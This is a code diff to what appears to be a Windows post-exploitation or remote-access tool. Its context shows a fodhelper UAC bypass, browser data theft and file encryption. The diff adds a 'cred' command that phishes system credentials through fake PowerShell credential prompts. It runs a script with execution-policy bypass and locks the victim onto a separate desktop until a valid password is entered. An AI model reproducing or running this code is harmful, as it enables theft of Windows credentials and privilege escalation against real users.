@@ -2,7 +2,6 @@ import contextlib
 import inspect
 import io
 import json
-import locale
 import os
 import subprocess
 import time
@@ -348,6 +347,8 @@ class Command:
     @desc('elevate as admin without uac prompt')
     @enclosing
     def uac(args):
+        """ Bypass UAC """
+
         @desc('trusted binary')
         @require_integrity('Medium')
         def fodhelper():
@@ -442,6 +443,7 @@ ShortSvcName="flcVPN"
     @desc('extract data from browser')
     @params(['browser', 'data'])
     def browser(this, args):
+        """ 提取浏览器数据 """
         home = os.path.expanduser('~')
         profile_paths = {
             'chrome': os.path.join(home, r'AppData\Local\Google\Chrome\User Data'),
@@ -471,6 +473,7 @@ ShortSvcName="flcVPN"
 
     @staticmethod
     def encrypt(path):
+        """ 加密文件 """
         import tempfile, base64
         from Crypto.Random import get_random_bytes
         key = get_random_bytes(32)
@@ -494,6 +497,7 @@ ShortSvcName="flcVPN"
     @staticmethod
     @params(['path', 'key'])
     def decrypt(this, args):
+        """ 解密文件 """
         import base64
         key = base64.b64decode(this.key)
         if os.path.isfile(this.path):
@@ -510,3 +514,58 @@ ShortSvcName="flcVPN"
             return 1, '\n'.join(result)
         else:
             return 0, 'No such file or directory'
+
+    @staticmethod
+    @desc('prompt for credentials')
+    @enclosing
+    def cred(args):
+        """ 系统凭证钓鱼 """
+
+        @desc('PSHostUserInterface.PromptForCredential')
+        def pshostui():
+            while True:
+                p = subprocess.Popen(
+                    'powershell.exe '
+                    '$cred=$Host.UI.PromptForCredential(\'\',\'\',$env:username,\'\');'
+                    'if($cred) {echo $cred.GetNetworkCredential().UserName $cred.GetNetworkCredential().Password} else {echo `n}',
+                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+                stdout, stderr = p.communicate()
+                if stderr:
+                    return 0, stderr.decode(locale.getdefaultlocale()[1])
+                lines = stdout.decode(locale.getdefaultlocale()[1]).splitlines()
+                if logon_user(*lines):
+                    return 1, str(lines)
+
+        @desc('CredentialPicker')
+        def credpicker():
+            filename = os.path.abspath('Cred.ps1')
+            if not os.path.isfile(filename):
+                return 0, 'File does not exist: {}'.format(filename)
+            p = subprocess.Popen(r'powershell.exe -ep bypass -file "{}"'.format(filename), stdout=subprocess.PIPE,
+                                 stderr=subprocess.PIPE, shell=True)
+            stdout, stderr = p.communicate()
+            if stderr:
+                return 0, stderr.decode(locale.getdefaultlocale()[1])
+            lines = stdout.decode(locale.getdefaultlocale()[1]).splitlines()
+            return 1, str(lines)
+
+        @desc('switch to new desktop')
+        def swdesk():
+            try:
+                create_desktop()
+                while True:
+                    status, result = create_process(
+                        r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe',
+                        ' $cred=$Host.UI.PromptForCredential(\'\',\'\',$env:username,\'\');'
+                        'if($cred) {echo $cred.GetNetworkCredential().UserName $cred.GetNetworkCredential().Password} else {echo `n}')
+                    if not status:
+                        raise Exception(result)
+                    lines = result.splitlines()
+                    if logon_user(*lines):
+                        switch_default()
+                        return 1, f'username: {lines[0]}\npassword: {lines[1]}'
+            except:
+                switch_default()
+                raise
+
+        return locals()
